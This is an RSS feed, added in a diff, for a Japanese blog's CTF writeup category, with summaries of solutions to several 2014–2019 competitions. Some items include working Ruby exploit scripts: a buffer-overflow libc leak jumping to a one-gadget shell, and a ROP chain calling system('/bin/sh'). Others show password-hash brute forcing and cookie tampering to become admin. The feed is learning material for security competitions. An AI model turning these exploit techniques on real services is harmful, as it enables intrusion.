@@ -1,0 +1,81 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>writeup on $ make life</title>
+    <link>https://owlinux1000.github.io/categories/writeup/</link>
+    <description>Recent content in writeup on $ make life</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Thu, 19 Sep 2019 23:49:38 +0900</lastBuildDate>
+    
+	<atom:link href="https://owlinux1000.github.io/categories/writeup/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>CSAW CTF 2014 Greenhornd writeup</title>
+      <link>https://owlinux1000.github.io/blog/greenhornd_writeup/</link>
+      <pubDate>Thu, 19 Sep 2019 23:49:38 +0900</pubDate>
+      
+      <guid>https://owlinux1000.github.io/blog/greenhornd_writeup/</guid>
+      <description>はじめに 本記事では、CSAW CTF 2014 で出題されたWindows 環境のPwnable 問題「greenhornd」を解説する。CTF におけるWindows のPwnable 問題が割合がかなり少なく知見もあまりまとまっていない分野なので自分の学習がてらまとめてみた。Linux でのPwnに慣れている人向けの記述になっているので、うまく補完しながら読んでほしい。
+1. 環境準備 1.1 Windows OS の準備 Linux と異なり環境構築に戸惑う人もいると思うので準備方法を記載していく。Windows OS自体は、Edgeのテスト用として用意されている、Free Virtual Machines from IE8 to MS Edge - Microsoft Edge Development を用いる。本ページにアクセスしたら、「Virtual machine」の欄を「IE11 on Win81 (x86)」に選択、「Select platform」を「VirtualBox」にして、ダウンロードボタンをクリックする。ダウンロードが完了したらzipを展開し、仮想マシンをインポートする。
+1.2 解析環境の準備 本VMは、ドライブが備わっていないので、VirtualBoxの設定からドライブを作成して、Guest Addition をインストールする。インストール後は、共有フォルダあるいはD&amp;amp;Dやクリップボードの共有ができるようにしてホストマシンと相互にやりとりできるようにしておく。また、ホストマシンと本VMにpingが届くことも確認しておく(Windows はpingをデフォルトで応答しないので、VM側からホストマシン側へ飛ばすと良い。) 最後に、検証やポートの公開などで面倒なので、Windows Firewall を無効にしておく。
+次に、本問題フアィルと解析する際にVM側に必要なソフトウェアをダウンロードする。以下に列挙する。
+ greenhornd.exe  問題のバイナリファイル   AppJailLauncher.exe  Windows におけるPwn 問題を動作させる定番のソフトウェア(らしい)   Visual Studio 2013 の Visual C++ 再頒布可能パッケージ  greenhornd を実行しようとすると「msvcr120.dll」が無いためにエラーになるのでインストールする ちなみにmsvcr120.</description>
+    </item>
+    
+    <item>
+      <title>Csaw2019 writeup</title>
+      <link>https://owlinux1000.github.io/blog/csaw2019/</link>
+      <pubDate>Mon, 16 Sep 2019 09:50:28 +0900</pubDate>
+      
+      <guid>https://owlinux1000.github.io/blog/csaw2019/</guid>
+      <description>Misc mcgriddlev2  問題文にFLAGが記載されている flag{W3lcome_7o_CSAW_QUALS_2019!}  Pwn baby_boi (50pt)  シンプルなBOFでIPが奪える問題 libcのアドレスを出力してくれているので、配布されたlibcでオフセット求めてOne-Gadget に飛ばしてシェルを奪う  #!/usr/bin/env ruby # coding: ascii-8bit require &amp;#39;pwn&amp;#39; $z = Sock.new &amp;#34;localhost&amp;#34;, 8888 $z = Sock.new &amp;#34;pwn.chal.csaw.io&amp;#34;, 1005 libc = ELF.new &amp;#34;./libc-2.27.so&amp;#34; #libc = ELF.new &amp;#34;/lib/x86_64-linux-gnu/libc-2.29.so&amp;#34; def z; $z; end z.recvuntil(&amp;#34;\n&amp;#34;) libc_printf = z.recvuntil(&amp;#34;\n&amp;#34;).match(/: (.+)/)[1].to_i(16) libc_base = libc_printf - libc.symbols[&amp;#34;printf&amp;#34;] puts &amp;#34;%x&amp;#34; % libc_base payload = &amp;#34;A&amp;#34; * 40 payload &amp;lt;&amp;lt; p64(libc_base + 0x4f322) z.sendline(payload) z.interact  flag{baby_boi_dodooo_doo_doo_dooo}  GOT Milk?</description>
+    </item>
+    
+    <item>
+      <title>HarekazeCTF 2019 writeup</title>
+      <link>https://owlinux1000.github.io/blog/harekazectf2019/</link>
+      <pubDate>Sun, 19 May 2019 16:54:53 +0900</pubDate>
+      
+      <guid>https://owlinux1000.github.io/blog/harekazectf2019/</guid>
+      <description>Baby ROP 1  バイナリ中で、system 関数使ってechoしており、Canary等もないBOFが起こるので、pop rdi; ret 使ってsystem(/bin/sh) を呼ぶだけ  #!/usr/bin/env ruby require &amp;#39;pwn&amp;#39; context.log_level = :debug z = Sock.new &amp;#34;problem.harekaze.com&amp;#34;, 20001 pop_rdi_ret = p64(0x00400683) system = p64(0x4005e3) STDIN.gets z.recvuntil &amp;#34;? &amp;#34; payload = &amp;#34;A&amp;#34; * 24 payload &amp;lt;&amp;lt; pop_rdi_ret payload &amp;lt;&amp;lt; p64(0x601048) payload &amp;lt;&amp;lt; system z.sendline payload z.interact  HarekazeCTF{r3turn_0r13nt3d_pr0gr4mm1ng_i5_3ss3nt141_70_pwn}  Baby ROP 2  system 関数などは、存在しないが、libc が配布されているので、ROPでlibcアドレスリークして、One-Gagdet に飛ばすだけ  #!/usr/bin/env ruby require &amp;#39;pwn&amp;#39; context.log_level = :debug z = Sock.</description>
+    </item>
+    
+    <item>
+      <title>Angstrom2019 writeup</title>
+      <link>https://owlinux1000.github.io/blog/angstrom2019/</link>
+      <pubDate>Thu, 25 Apr 2019 21:57:22 +0900</pubDate>
+      
+      <guid>https://owlinux1000.github.io/blog/angstrom2019/</guid>
+      <description>Misc IRC  freenodeに入るとFLAG actf{like_discord_but_worse}  The mueller Report  PDFが渡されるので、とりあえずactfでgrepするとFLAG actf{no0o0o0_col1l1l1luuuusiioooon}  Blank PDF  PDFが渡されるが開けず、fileコマンドで見るとPDFとして認識されていないためヘッダーを見るとマジックナンバーがかけているので直してあげると開けるようになりFLAG actf{knot_very_interesting}  Paper Trail  pcapngが渡されるので、Follow TCP StreamするとIRCで1文字ずつFLAGを送信している actf{fake_math_papers}  Scratch It Out  project.jsonという謎のjsonファイルが渡されるので、キーでいろいろぐぐる＆問題名からプログラミング言語Scratchの話だとわかる project.jsonをzipで圧縮し、htt@s://scratch.mit.edu でファイルを読み込まされるとゲームが復元される 最初の項目が、「旗が押されたとき」なので、画面右らへんの緑色の旗を押すと音声とともにFLAGがでる 地味に面白い actf{Th5_0pT1maL_LANgUaG3}  Web Control you  HTMLソースを見てFLAG actf{control_u_so_we_can&amp;rsquo;t_control_you}  Crypto Classy Cipher  ソースコードが渡され中を見るとシーザ暗号なのでソルバを書く actf{so_charming}  encrypted = &amp;#39;:&amp;lt;M?TLH8&amp;lt;A:KFBG@V&amp;#39; for i in range(0xff): for c in encrypted: print(chr((ord(c)-i) % 0xff), end=&amp;#39;&amp;#39;) Really Secure Algorithm  RSAのパラメータがe, p, q, cが渡されるので復号するだけ actf{really_securent_algorithm}  require_relative &amp;#39;.</description>
+    </item>
+    
+    <item>
+      <title>VolgaCTF 2019 writeup</title>
+      <link>https://owlinux1000.github.io/blog/volga2019/</link>
+      <pubDate>Wed, 03 Apr 2019 08:07:43 +0900</pubDate>
+      
+      <guid>https://owlinux1000.github.io/blog/volga2019/</guid>
+      <description>Shadow cat  /etc/shadowとencrypted.txtが渡される /etc/shadowには、1文字のユーザ名とその暗号化されたパスワードなどが乗っており、encrypted.txtにはその1文字で構成される文字列が含まれており、単一替え字暗号だとわかる /etc/shadowのパスワードを総当たりで解き、得れた替え字表を使って置換するコードを書いて実行したらFLAG  #!/usr/bin/env ruby require &amp;#39;unix_crypt&amp;#39; # gem install unix-crypt org = [] ans = [] lines = File.read(&amp;#34;./shadow.txt&amp;#34;).split(&amp;#34;\n&amp;#34;) lines.each do |line| org &amp;lt;&amp;lt; line.split(&amp;#34;:&amp;#34;)[0] enc = line.split(&amp;#34;:&amp;#34;)[1] salt = line.split(&amp;#34;$&amp;#34;)[2] 0x1f.upto(0x7e) do |i| hashpass = UnixCrypt::SHA512.build(i.chr, salt) if hashpass == enc ans &amp;lt;&amp;lt; i.chr puts &amp;#34;Passed&amp;#34; break end end end encrypted = File.read(&amp;#34;./encrypted.txt&amp;#34;).chomp puts &amp;#34;VolgaCTF{#{encrypted.tr(org.join(&amp;#34;&amp;#34;), ans.join(&amp;#34;&amp;#34;))}}&amp;#34;  VolgaCTF{pass_hash_cracking_hashcat_always_lurks_in_the_shadows}  </description>
+    </item>
+    
+    <item>
+      <title>PragyanCTF 2019 writeup</title>
+      <link>https://owlinux1000.github.io/blog/pragyan2019/</link>
+      <pubDate>Sun, 10 Mar 2019 22:48:37 +0900</pubDate>
+      
+      <guid>https://owlinux1000.github.io/blog/pragyan2019/</guid>
+      <description>Welcome  JPEGが渡されるが、binwalkをかけると中にzipがあるので取り出す 取り出したzipを展開すると壊れたbmpとパスワード付きのzipが展開される bmpファイルの末尾にはbase64エンコードされたような文字列があるのでデコードするとzipのパスワード zipを展開するとpngファイルがでてくる stegosolveで適当にぽちぽちやるとFLAG pctf{st3gs0lv3_1s_u53ful}  Cookie Monster  Cookieにflagというフィールドがあり、MD5が設定されている どこかのMD5クラックサイトで検索するとpcがでてくる フラグフォーマットは、pctf{なのでひたすらこのCookieのMD5の元を考えれば良いとわかる pctf{c0oki3s_@re_yUm_bUt_tHEy_@ls0_r3vEaL_@_l0t}  Feed_me  バイナリを読むと、渡された乱数3つがチェック用の値になっている 入力文字列を10byteずつ分割してatoiに流し込んでいて、以下の式が成り立てばおｋなので、あとは算数  x + y = a1 y + z = a2 x + z = a3  自分が解いたときのケース  Can you cook my favourite food using these ingredients :) -10026 ; -8250 ; -12490 ; -000007133-000002893-000005357 That&#39;s yummy.... Here is your gift: pctf{p1zz4_t0pp3d_w1th_p1n34ppl3_s4uc3} Game of Faces  ページにアクセスすると3色のよくわからん正方形があるが、ソースを見るとファイルアップロードが見える 適当にファイルをアップロードするとh1タグでbase64エンコードされた文字列が帰ってくるのでデコードするとファイル名がわかる ファイル名で直接アクセスするとフラグ pctf{You_L00K_Wi3Rd_IN_H3R3}  Easy RSA  e, c, nのパラメータが渡されるが、eが著しく大きいので、Wiener&amp;rsquo;s Attackだとわかる コード書いて、秘密鍵dを計算すると12978409760901509356642421072925801006324287746872153539187221529835976408177だとわかる あとは普通にRSAを解読したら、出てきた数値を16進数表記にして1byteずつasciiにすればフラグ pctf{Sup3r_st4nd4rd_W31n3r_4tt4ck}  Late PR  課題を提出しようとしてたけどパソコンがクラッシュしたという問題文とともにイメージファイルが渡される vol.</description>
+    </item>
+    
+    <item>
+      <title>BesidesCTF 2019 writeup</title>
+      <link>https://owlinux1000.github.io/blog/bsidessf2019/</link>
+      <pubDate>Sun, 10 Mar 2019 22:43:52 +0900</pubDate>
+      
+      <guid>https://owlinux1000.github.io/blog/bsidessf2019/</guid>
+      <description>blink  apkが渡されるのでunzipして、classes.dexをdex2jarでjarファイルに変換 jarファイルをunzipして、classファイルをjadで一括逆コンパイル 適当にファイルを眺めていると/com/example/blink/r2d2.jadにbase64でエンコードされた文字列があるのでデコード CTF{PUCKMAN}と書かれた画像が出てくる  zippy  pcapngが渡されるのでFollo TCP Streamをするとsupercomplexpasswordがzipのパスワードだとわかる パケットからzipファイルを通信してるパケットを見つけて抽出 パスワードを使ってunzipすると中のflag.txtにCTF{this_flag_is_your_flag}  futurella  HTMLのソースを見るとCTF{bring_it_back}  kookie  cookie/monsterでログインできるのでログインする その際のCookieを見ると、cookieになっているので、これをadminに変更 その後reloadするとCTF{kookie_cookies}  </description>
+    </item>
+    
+  </channel>
+</rss>
